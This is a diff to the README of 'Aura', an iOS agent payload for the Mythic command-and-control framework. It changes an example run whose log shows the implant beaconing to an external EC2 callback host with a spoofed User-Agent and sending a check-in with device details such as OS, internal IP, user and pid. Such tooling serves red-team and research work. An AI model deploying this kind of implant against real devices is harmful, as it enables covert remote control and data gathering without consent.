@@ -17,17 +17,9 @@ Aura is an iOS payload designed to interact with a Mythic C2 (command and contro
 
 ## Execution example
 ```txt
-Brandon-Daltons-iPad:~ mobile$ chmod +x aura && ./aura
-2024-09-20 13:00:31.313 aura[1846:240399] C2 Configuration Data:
-2024-09-20 13:00:31.314 aura[1846:240399] Callback Host: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com
-2024-09-20 13:00:31.315 aura[1846:240399] Callback Port: 80
-2024-09-20 13:00:31.316 aura[1846:240399] Headers: {
-    "User-Agent" = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-}
-2024-09-20 13:00:31.316 aura[1846:240399] Payload UUID: 2a2d1c2f-88a2-4e34-81a9-b7267ae93458
-2024-09-20 13:00:31.318 aura[1846:240399] [DEBUG] Check-in URL: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com:80/agent_message
-2024-09-20 13:00:31.495 aura[1846:240399] [DEBUG] Check-in Data:
-{
+2024-09-20 18:13:33.914 aura[2322:270194] 👋 Hello from the Aura iOS agent!
+2024-09-20 18:13:33.916 aura[2322:270194] [DEBUG] Check-in URL: http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com:80/agent_message
+2024-09-20 18:13:34.027 aura[2322:270194] {
     action = checkin;
     architecture = arm64;
     domain = local;
@@ -38,9 +30,9 @@ Brandon-Daltons-iPad:~ mobile$ chmod +x aura && ./aura
         "192.168.0.18"
     );
     os = "iOS 12.5.7";
-    pid = 1846;
+    pid = 2322;
     "process_name" = aura;
     user = mobile;
-    uuid = "2a2d1c2f-88a2-4e34-81a9-b7267ae93458";
+    uuid = "b355bc11-0c78-41ec-b3b7-7220561137fa";
 }
 ```
